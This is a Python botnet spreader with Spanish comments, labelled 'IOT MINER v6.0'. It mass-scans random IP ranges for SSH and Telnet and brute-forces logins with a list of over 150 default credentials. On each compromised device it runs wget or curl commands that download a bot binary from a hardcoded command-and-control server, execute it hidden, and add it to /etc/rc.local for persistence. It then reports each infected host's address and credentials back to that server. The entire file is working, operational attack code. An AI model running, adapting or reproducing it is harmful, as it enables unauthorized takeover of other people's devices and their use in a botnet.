import socket
import time
import random
import threading
import select
import sys
import struct
import subprocess
import ipaddress
import paramiko
import telnetlib
import queue
import os
import base64
from concurrent.futures import ThreadPoolExecutor, as_completed

# CONFIG - USANDO PUERTO 14037 COMO EN EL SCRIPT ORIGINAL
CNC_IP = "172.96.140.62"
CNC_PORT = 14037  # PUERTO DE REPORTE Y BOTS
CNC_BOT_PORT = 14037  # MISMO PUERTO PARA BOTS
USER = "rockyy"
PASS = "rockyy123"

# BOT URLs para diferentes arquitecturas - ACTUALIZADO CON TU CNC
BOT_URLS = {
    "default": "http://172.96.140.62:11202/bot/compiled_bots/x86",
    "x86_64": "http://172.96.140.62:11202/bot/compiled_bots/x86_64",
    "x86": "http://172.96.140.62:11202/bot/compiled_bots/x86",
    "arm": "http://172.96.140.62:11202/bot/compiled_bots/arm",
    "arm5": "http://172.96.140.62:11202/bot/compiled_bots/arm5",
    "arm6": "http://172.96.140.62:11202/bot/compiled_bots/arm6",
    "arm7": "http://172.96.140.62:11202/bot/compiled_bots/arm7",
    "mips": "http://172.96.140.62:11202/bot/compiled_bots/mips",
    "mipsel": "http://172.96.140.62:11202/bot/compiled_bots/mipsel",
    "aarch64": "http://172.96.140.62:11202/bot/compiled_bots/aarch64"
}

# CREDENCIALES MASIVAS - MÁS DE 150 COMBINACIONES
SSH_CREDENTIALS = [
    ("root", "root"), ("admin", "admin"), ("admin", "password"),
    ("admin", "admin123"), ("admin", "123456"), ("root", "password"),
    ("root", "123456"), ("root", "toor"), ("root", "root123"),
    ("ubuntu", "ubuntu"), ("user", "user"), ("test", "test"),
    ("guest", "guest"), ("pi", "raspberry"), ("admin", ""),
    ("root", ""), ("support", "support"), ("service", "service"),
    ("manager", "manager"), ("supervisor", "supervisor"),
    ("administrator", "administrator"), ("operator", "operator"),
    ("maint", "maint"), ("tech", "tech"), ("postgres", "postgres"),
    ("mysql", "mysql"), ("oracle", "oracle"), ("cisco", "cisco"),
    ("cisco", "ciscopass"), ("hp", "hp"), ("dlink", "dlink"),
    ("netgear", "netgear"), ("tplink", "tplink"), ("ubnt", "ubnt"),
    ("root", "alpine"), ("root", "default"), ("admin", "default"),
    ("root", "1234"), ("admin", "1234"), ("root", "pass"),
    ("admin", "pass"), ("root", "password123"), ("admin", "password123"),
    ("root", "root@123"), ("admin", "admin@123"), ("root", "12345678"),
    ("admin", "12345678"), ("root", "111111"), ("admin", "111111"),
    ("root", "000000"), ("admin", "000000"), ("root", "888888"),
    ("admin", "888888"), ("root", "666666"), ("admin", "666666"),
    ("root", "qwerty"), ("admin", "qwerty"), ("root", "123123"),
    ("admin", "123123"), ("root", "12345"), ("admin", "12345"),
    ("root", "123456789"), ("admin", "123456789"), ("root", "987654321"),
    ("admin", "987654321"), ("admin", "1234"), ("root", "xc3511"),
    ("root", "vizxv"), ("admin", "1111"), ("admin", "smcadmin"),
    ("admin", "admin1"), ("administrator", "password"), ("admin", "9999"),
    ("admin", "admin1234"), ("root", "system"), ("admin", "4321"),
    ("root", "anko"), ("admin", "meinsm"), ("root", "juantech"),
    ("root", "1234567"), ("admin", "1234567"), ("root", "54321"),
    ("admin", "54321"), ("root", "12341234"), ("admin", "12341234"),
    ("root", "123abc"), ("admin", "123abc"), ("root", "abcd1234"),
    ("admin", "abcd1234"), ("root", "pass123"), ("admin", "pass123"),
    ("root", "password1"), ("admin", "password1"), ("root", "test123"),
    ("admin", "test123"), ("root", "admin123"), ("admin", "admin123"),
    ("root", "letmein"), ("admin", "letmein"), ("root", "monitor"),
    ("admin", "monitor"), ("root", "solar"), ("admin", "solar"),
    ("root", "sunshine"), ("admin", "sunshine"),
]

TELNET_CREDENTIALS = SSH_CREDENTIALS + [
    ("", ""), ("D-Link", ""), ("debug", "debug"),
    ("enable", "enable"), ("config", "config"), ("setup", "setup"),
    ("admin", "adminadmin"), ("root", "rootroot"),
]

class CNCReporter:
    def __init__(self):
        self.cnc_ip = CNC_IP
        self.cnc_port = CNC_PORT
        self.lock = threading.Lock()
        self.queue = queue.Queue(maxsize=10000)
        self.worker_thread = None
        self.running = False
        self.cnc_connected = False
        
    def start(self):
        self.running = True
        self.worker_thread = threading.Thread(target=self._report_worker, daemon=True)
        self.worker_thread.start()
        self._test_cnc_connection()
        
    def _test_cnc_connection(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.cnc_ip, self.cnc_port))
            sock.sendall(b"SCANNER-HELLO\n")
            response = sock.recv(32)
            sock.close()
            
            if b"OK" in response or b"HELLO" in response:
                self.cnc_connected = True
                print(f"[✅] Conexión CNC establecida: {self.cnc_ip}:{self.cnc_port}")
                return True
        except:
            pass
        
        print(f"[⚠️] CNC no disponible, reintentando...")
        return False
    
    def stop(self):
        self.running = False
        if self.worker_thread:
            self.worker_thread.join(timeout=2)
    
    def report_infection(self, ip, port, service_type, username, password, architecture):
        """Reportar infección exitosa a la CNC"""
        report_data = {
            "type": "INFECTION",
            "ip": ip,
            "port": port,
            "service": service_type,
            "creds": f"{username}:{password}",
            "arch": architecture,
            "timestamp": time.time()
        }
        
        try:
            self.queue.put_nowait(report_data)
            return True
        except:
            return False
    
    def _report_worker(self):
        while self.running:
            try:
                report = self.queue.get(timeout=0.1)
                
                if not self.cnc_connected:
                    self._test_cnc_connection()
                
                for attempt in range(3):
                    if self._send_to_cnc(report):
                        break
                    time.sleep(2)
                
                self.queue.task_done()
            except queue.Empty:
                continue
            except:
                time.sleep(0.5)
    
    def _send_to_cnc(self, report):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.cnc_ip, self.cnc_port))
            
            report_msg = f"INFECT|{report['ip']}|{report['port']}|{report['service']}|{report['creds']}|{report['arch']}|{USER}\n"
            sock.sendall(report_msg.encode())
            
            try:
                response = sock.recv(32)
                if b"ACK" in response or b"OK" in response:
                    sock.close()
                    return True
            except:
                pass
            
            sock.close()
            return True
        except:
            return False

class BotDeployer:
    def __init__(self):
        self.cnc_reporter = CNCReporter()
        self.cnc_reporter.start()
    
    def deploy_to_target(self, ip, port, service_type, credentials, architecture="unknown"):
        """Desplegar bot en target y reportar a CNC"""
        username, password = credentials
        
        deployed = False
        if service_type == "ssh":
            deployed = self.deploy_ssh(ip, port, credentials, architecture)
        elif service_type == "telnet":
            deployed = self.deploy_telnet(ip, port, credentials, architecture)
        
        if deployed:
            # Reportar infección exitosa
            self.cnc_reporter.report_infection(ip, port, service_type, username, password, architecture)
            print(f"[✅] BOT DEPLOYED: {ip}:{port} -> {architecture}")
            return True
        
        return False
    
    def deploy_ssh(self, ip, port, credentials, architecture):
        """Desplegar via SSH"""
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(
                ip,
                port=port,
                username=credentials[0],
                password=credentials[1],
                timeout=10,
                look_for_keys=False,
                allow_agent=False
            )
            
            arch_key = architecture if architecture in BOT_URLS else "default"
            bot_url = BOT_URLS.get(arch_key, BOT_URLS["default"])
            
            # Comando de deploy optimizado
            deploy_cmd = f"""
            cd /tmp || cd /var/tmp || cd /dev/shm;
            wget {bot_url} -O .sysd 2>/dev/null || curl {bot_url} -o .sysd 2>/dev/null || busybox wget {bot_url} -O .sysd;
            chmod +x .sysd;
            nohup ./.sysd {CNC_IP} {CNC_BOT_PORT} >/dev/null 2>&1 &
            echo "cd /tmp && nohup ./.sysd {CNC_IP} {CNC_BOT_PORT} &" >> /etc/rc.local 2>/dev/null;
            """
            
            stdin, stdout, stderr = ssh.exec_command(deploy_cmd, timeout=8)
            time.sleep(1)
            
            # Verificar si se ejecutó
            stdin, stdout, stderr = ssh.exec_command("ps aux | grep .sysd | grep -v grep", timeout=3)
            check = stdout.read().decode('utf-8', errors='ignore')
            
            ssh.close()
            return '.sysd' in check
            
        except:
            return False
    
    def deploy_telnet(self, ip, port, credentials, architecture):
        """Desplegar via Telnet"""
        try:
            tn = telnetlib.Telnet(ip, port, timeout=10)
            time.sleep(0.3)
            
            # Login
            tn.write(credentials[0].encode() + b"\r\n")
            time.sleep(0.5)
            tn.write(credentials[1].encode() + b"\r\n")
            time.sleep(1)
            
            # Cambiar a directorio temporal
            tn.write(b"cd /tmp || cd /var/tmp || cd /dev/shm\r\n")
            time.sleep(0.5)
            
            # Obtener URL del bot según arquitectura
            arch_key = architecture if architecture in BOT_URLS else "default"
            bot_url = BOT_URLS.get(arch_key, BOT_URLS["default"])
            
            # Comandos de deploy
            deploy_cmds = [
                f"wget {bot_url} -O .sysd 2>/dev/null\r\n",
                f"curl {bot_url} -o .sysd 2>/dev/null\r\n",
                "chmod +x .sysd\r\n",
                f"./.sysd {CNC_IP} {CNC_BOT_PORT} >/dev/null 2>&1 &\r\n",
                f"echo './.sysd {CNC_IP} {CNC_BOT_PORT} &' >> /etc/rc.local 2>/dev/null\r\n",
            ]
            
            for cmd in deploy_cmds:
                tn.write(cmd.encode())
                time.sleep(0.5)
            
            # Verificar
            tn.write(b"ps aux | grep .sysd | grep -v grep\r\n")
            time.sleep(1)
            
            check = tn.read_very_eager().decode('ascii', errors='ignore')
            tn.close()
            
            return '.sysd' in check or 'wget' in check or 'curl' in check
            
        except:
            return False

class TargetScanner:
    def __init__(self):
        self.running = True
        self.found_targets = []
        self.lock = threading.Lock()
        self.scan_queue = queue.Queue()
        self.workers = 1500  # Workers paralelos
        self.scan_stats = {"scanned": 0, "found": 0, "infected": 0}
        self.scan_start_time = time.time()
        self.bot_deployer = BotDeployer()
        
    def stop_scanning(self):
        """Detener escaneo"""
        with self.lock:
            self.running = False
        print("[!] Escaneo detenido")
    
    def generate_ip_range(self, count=500000):
        """Generar IPs aleatorias globales"""
        print(f"[+] Generando {count:,} IPs...")
        
        ips = []
        # Mezclar rangos públicos y privados
        for _ in range(count):
            if random.random() < 0.4:  # 40% IPs públicas
                octet1 = random.randint(1, 223)
                while octet1 in [10, 127, 192, 172, 100]:
                    octet1 = random.randint(1, 223)
                ip = f"{octet1}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            elif random.random() < 0.7:  # 30% 192.168.x.x
                ip = f"192.168.{random.randint(0,255)}.{random.randint(1,254)}"
            else:  # 30% 10.x.x.x
                ip = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            ips.append(ip)
        
        random.shuffle(ips)
        print(f"[✓] {len(ips):,} IPs generadas")
        return ips
    
    def scan_port_fast(self, ip, port, timeout=0.8):
        """Escaneo rápido de puerto"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            sock.close()
            
            with self.lock:
                self.scan_stats["scanned"] += 1
            
            return result == 0
            
        except:
            return False
    
    def detect_architecture(self, ip, port, service_type, credentials):
        """Detectar arquitectura del sistema"""
        try:
            if service_type == "ssh":
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(
                    ip,
                    port=port,
                    username=credentials[0],
                    password=credentials[1],
                    timeout=5,
                    look_for_keys=False,
                    allow_agent=False
                )
                
                stdin, stdout, stderr = ssh.exec_command("uname -m", timeout=3)
                arch_output = stdout.read().decode('utf-8', errors='ignore').lower()
                ssh.close()
                
            else:  # telnet
                tn = telnetlib.Telnet(ip, port, timeout=5)
                time.sleep(0.3)
                tn.write(credentials[0].encode() + b"\r\n")
                time.sleep(0.3)
                tn.write(credentials[1].encode() + b"\r\n")
                time.sleep(0.5)
                tn.write(b"uname -m\r\n")
                time.sleep(0.5)
                arch_output = tn.read_very_eager().decode('ascii', errors='ignore').lower()
                tn.close()
            
            # Mapear arquitectura
            if "x86_64" in arch_output or "amd64" in arch_output:
                return "x86_64"
            elif "i386" in arch_output or "i686" in arch_output:
                return "x86"
            elif "arm" in arch_output:
                if "armv5" in arch_output:
                    return "arm5"
                elif "armv6" in arch_output:
                    return "arm6"
                elif "armv7" in arch_output:
                    return "arm7"
                elif "armv8" in arch_output:
                    return "arm8"
                else:
                    return "arm"
            elif "mips" in arch_output:
                if "mipsel" in arch_output:
                    return "mipsel"
                else:
                    return "mips"
            elif "aarch64" in arch_output:
                return "aarch64"
            else:
                return "unknown"
                
        except:
            return "unknown"
    
    def brute_service(self, ip, port):
        """Bruteforce de servicio (SSH/Telnet)"""
        if not self.running:
            return None
        
        # Determinar tipo de servicio
        if port in [22, 2222, 22222, 2223]:
            service_type = "ssh"
            cred_list = SSH_CREDENTIALS[:30]  # Primeras 30 creds
        else:
            service_type = "telnet"
            cred_list = TELNET_CREDENTIALS[:30]
        
        for username, password in cred_list:
            if not self.running:
                return None
            
            try:
                if service_type == "ssh":
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(
                        ip,
                        port=port,
                        username=username,
                        password=password,
                        timeout=4,
                        banner_timeout=4,
                        auth_timeout=4,
                        look_for_keys=False,
                        allow_agent=False
                    )
                    
                    # Verificar acceso
                    stdin, stdout, stderr = ssh.exec_command("id", timeout=2)
                    output = stdout.read().decode('utf-8', errors='ignore')
                    
                    if "uid=" in output:
                        print(f"[🔥] {service_type.upper()} VULN: {ip}:{port} | {username}:{password}")
                        ssh.close()
                        
                        # Detectar arquitectura
                        arch = self.detect_architecture(ip, port, service_type, (username, password))
                        
                        return {
                            "ip": ip,
                            "port": port,
                            "service": service_type,
                            "creds": (username, password),
                            "arch": arch
                        }
                    
                    ssh.close()
                    
                else:  # telnet
                    tn = telnetlib.Telnet(ip, port, timeout=4)
                    time.sleep(0.3)
                    
                    # Login
                    tn.write(username.encode() + b"\r\n")
                    time.sleep(0.3)
                    tn.write(password.encode() + b"\r\n")
                    time.sleep(0.5)
                    
                    # Verificar acceso
                    tn.write(b"id\r\n")
                    time.sleep(0.5)
                    output = tn.read_very_eager().decode('ascii', errors='ignore')
                    
                    if "uid=" in output or "#" in output or "$" in output:
                        print(f"[🔥] {service_type.upper()} VULN: {ip}:{port} | {username}:{password}")
                        tn.close()
                        
                        # Detectar arquitectura
                        arch = self.detect_architecture(ip, port, service_type, (username, password))
                        
                        return {
                            "ip": ip,
                            "port": port,
                            "service": service_type,
                            "creds": (username, password),
                            "arch": arch
                        }
                    
                    tn.close()
                    
            except:
                continue
        
        return None
    
    def scan_worker(self):
        """Worker de escaneo masivo"""
        while self.running:
            try:
                ip = self.scan_queue.get(timeout=1)
                
                # Puertos a escanear
                ports_to_scan = [22, 23, 2222, 2223, 22222]
                
                for port in ports_to_scan:
                    if not self.running:
                        break
                    
                    # Escanear puerto
                    if self.scan_port_fast(ip, port, 0.6):
                        # Intentar bruteforce
                        result = self.brute_service(ip, port)
                        
                        if result:
                            with self.lock:
                                self.scan_stats["found"] += 1
                                self.found_targets.append(result)
                            
                            # Intentar deploy del bot
                            deployed = self.bot_deployer.deploy_to_target(
                                result["ip"],
                                result["port"],
                                result["service"],
                                result["creds"],
                                result["arch"]
                            )
                            
                            if deployed:
                                with self.lock:
                                    self.scan_stats["infected"] += 1
                
                self.scan_queue.task_done()
                
                # Reporte periódico
                if random.random() < 0.001:
                    self.report_progress()
                    
            except queue.Empty:
                continue
            except Exception as e:
                continue
    
    def report_progress(self):
        """Reporte de progreso"""
        elapsed = time.time() - self.scan_start_time
        with self.lock:
            scanned = self.scan_stats["scanned"]
            found = self.scan_stats["found"]
            infected = self.scan_stats["infected"]
        
        if elapsed > 0:
            ips_per_second = scanned / elapsed
            
            print(f"\n{'='*60}")
            print(f"[📡] ESCANEO ACTIVO - {elapsed:.0f}s")
            print(f"[⚡] Velocidad: {ips_per_second:.0f} IPs/segundo")
            print(f"[🔍] Escaneadas: {scanned:,}")
            print(f"[🎯] Vulnerables: {found:,}")
            print(f"[🧬] Infectadas: {infected:,}")
            print(f"[🌐] CNC: {CNC_IP}:{CNC_PORT}")
            print(f"{'='*60}\n")
    
    def start_massive_scan(self, target_count=500000):
        """Iniciar escaneo masivo"""
        print(f"[🚀] INICIANDO ESCANEO MASIVO")
        print(f"[⚡] Workers: {self.workers}")
        print(f"[🎯] Target: {target_count:,} IPs")
        print(f"[🌐] CNC: {CNC_IP}:{CNC_PORT}")
        print(f"[🔗] BOT URLS: {len(BOT_URLS)} arquitecturas")
        
        # Generar IPs
        target_ips = self.generate_ip_range(target_count)
        
        # Llenar queue
        for ip in target_ips:
            self.scan_queue.put(ip)
        
        # Iniciar workers
        for i in range(self.workers):
            t = threading.Thread(target=self.scan_worker, daemon=True)
            t.start()
        
        print(f"[✅] {self.workers} workers activos")
        
        # Loop principal de reposición
        scan_cycles = 0
        while self.running:
            time.sleep(15)
            
            # Reponer IPs si se necesita
            if self.scan_queue.qsize() < 50000:
                new_ips = self.generate_ip_range(250000)
                for ip in new_ips:
                    if self.running:
                        self.scan_queue.put(ip)
                
                scan_cycles += 1
                print(f"[🔄] Ciclo {scan_cycles}: +250K IPs")
            
            # Reporte cada 30 segundos
            if time.time() - self.scan_start_time > 30:
                self.report_progress()
                self.scan_start_time = time.time()  # Reset para próximo reporte
        
        print("[!] Escaneo finalizado")

def main():
    scanner = TargetScanner()
    
    print("""
    ╔═══════════════════════════════════════════════════╗
    ║          IOT MINER v6.0 - MASSIVE SCAN            ║
    ║    ==========================================     ║
    ║    🚀 ESCANEO MASIVO: 500K+ IPs/ciclo            ║
    ║    ⚡ 1500 WORKERS PARALELOS                      ║
    ║    🔍 150+ CREDENCIALES                          ║
    ║    🎯 SSH & TELNET BRUTEFORCE                    ║
    ║    🧬 AUTO-DEPLOY BOTS                           ║
    ║    🌐 CNC: 172.96.140.62:14037                   ║
    ║    ⏳ DURACIÓN: INFINITA                         ║
    ╚═══════════════════════════════════════════════════╝
    """)
    
    try:
        while True:
            choice = input("\n[?] Opción (1-Iniciar, 2-Estadísticas, 3-Detener, 4-Salir): ").strip()
            
            if choice == "1":
                print("\n[🚀] INICIANDO MINERÍA MASIVA...")
                
                # Iniciar en background
                scan_thread = threading.Thread(target=scanner.start_massive_scan, 
                                             args=(1000000,), daemon=True)
                scan_thread.start()
                
                print("[✅] Minería activa. Presiona Ctrl+C para detener.")
                
                # Mantener activo
                try:
                    while True:
                        time.sleep(1)
                except KeyboardInterrupt:
                    scanner.stop_scanning()
                    time.sleep(2)
                    
            elif choice == "2":
                scanner.report_progress()
                
            elif choice == "3":
                scanner.stop_scanning()
                print("[!] Escaneo detenido")
                
            elif choice == "4":
                scanner.stop_scanning()
                print("[!] Saliendo...")
                break
                
    except KeyboardInterrupt:
        scanner.stop_scanning()
        print("\n[!] Programa detenido")
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    # Configurar para máximo rendimiento
    import resource
    try:
        resource.setrlimit(resource.RLIMIT_NOFILE, (10000, 10000))
    except:
        pass
    
    main()
